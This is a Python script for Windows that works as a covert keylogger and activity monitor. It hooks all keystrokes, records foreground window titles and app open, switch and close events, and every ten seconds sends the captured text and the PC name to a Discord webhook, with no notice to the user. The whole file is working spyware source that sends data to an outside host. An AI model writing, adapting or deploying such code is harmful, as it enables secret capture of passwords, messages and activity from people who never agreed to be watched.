import psutil
import requests
import time
import win32gui
import win32process
import re
import socket
import keyboard
import threading
from datetime import datetime

# Discord Webhook URL
WEBHOOK_URL = ""

# Get PC name
PC_NAME = socket.gethostname()

# Constants
INACTIVITY_THRESHOLD = 300  # 5 minutes
KEYSTROKE_SEND_INTERVAL = 10  # 10 seconds

# Tracking Variables
last_logged = None
app_start_times = {}
active_processes = set()
last_activity_time = time.time()
keystrokes = ""
last_keystroke_time = time.time()
keystroke_lock = threading.Lock()

# Function to format duration
def format_duration(seconds):
    if seconds < 60:
        return f"{seconds:.2f} seconds"
    elif seconds < 3600:
        minutes = seconds // 60
        seconds = seconds % 60
        return f"{int(minutes)} minute{'s' if minutes != 1 else ''} {seconds:.2f} seconds"
    else:
        hours = seconds // 3600
        minutes = (seconds % 3600) // 60
        seconds = (seconds % 3600) % 60
        return f"{int(hours)} hour{'s' if hours != 1 else ''} {int(minutes)} minute{'s' if minutes != 1 else ''} {seconds:.2f} seconds"

# Function to send logs to Discord
def send_to_discord(message):
    payload = {"content": message}
    requests.post(WEBHOOK_URL, json=payload)

# Function to get active window title
def get_active_window_title():
    hwnd = win32gui.GetForegroundWindow()
    if not hwnd:
        return None, None, None  # Ensure three return values

    _, pid = win32process.GetWindowThreadProcessId(hwnd)
    
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['pid'] == pid:
            return proc.info['name'], win32gui.GetWindowText(hwnd), hwnd  # Return hwnd as well
    
    return None, None, None  # Ensure consistent return values

# Function to send keystrokes
def send_keystrokes():
    global keystrokes, last_keystroke_time
    
    with keystroke_lock:
        if keystrokes.strip():
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            send_to_discord(f"[{timestamp}] [Keystrokes] {PC_NAME}: {keystrokes}")
            keystrokes = ""
    
    last_keystroke_time = time.time()

# Function to log keystrokes
def log_keystroke(event):
    global keystrokes, last_activity_time, last_keystroke_time
    
    last_activity_time = time.time()
    last_keystroke_time = time.time()
    key = event.name
    
    with keystroke_lock:
        if len(key) == 1 and key.isprintable():
            keystrokes += key
        elif key == "space":
            keystrokes += " "
        elif key == "enter":
            keystrokes += "\n"

# Start keylogger thread
keyboard.on_press(log_keystroke)
def start_keylogger():
    keyboard.wait()

keylogger_thread = threading.Thread(target=start_keylogger, daemon=True)
keylogger_thread.start()

# Function to periodically send keystrokes
def keystroke_monitor():
    while True:
        time.sleep(KEYSTROKE_SEND_INTERVAL)
        send_keystrokes()

keystroke_thread = threading.Thread(target=keystroke_monitor, daemon=True)
keystroke_thread.start()

# Monitoring loop
def monitor():
    global last_logged, active_processes, app_start_times, last_activity_time, last_keystroke_time
    
    while True:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        app_name, window_title, hwnd = get_active_window_title()
        if not app_name:
            time.sleep(2)
            continue
        
        current_processes = {proc.info['name'] for proc in psutil.process_iter(['name'])}
        closed_processes = active_processes - current_processes

        # Detect closed applications
        for closed_app in closed_processes:
            if closed_app in app_start_times:
                duration = time.time() - app_start_times.pop(closed_app)
                close_message = f"[{timestamp}] {PC_NAME} - User closed {closed_app} after {format_duration(duration)}"
                send_to_discord(close_message)
        
        active_processes = current_processes

        if app_name:
            last_activity_time = time.time()
            
            if (app_name, window_title) != last_logged:
                if last_logged and last_logged[0] in app_start_times:
                    duration = time.time() - app_start_times[last_logged[0]]
                    switch_message = f"[{timestamp}] {PC_NAME} - User switched from {last_logged[0]} to {app_name} after {format_duration(duration)}"
                    send_to_discord(switch_message)
                
                if app_name not in app_start_times:
                    log_message = f"[{timestamp}] {PC_NAME} - User opened {app_name}: {window_title}"
                    app_start_times[app_name] = time.time()
                else:
                    log_message = f"[{timestamp}] {PC_NAME} - User switched to {app_name}: {window_title}"
                
                send_to_discord(log_message)
                last_logged = (app_name, window_title)

        time.sleep(2)

if __name__ == "__main__":
    monitor()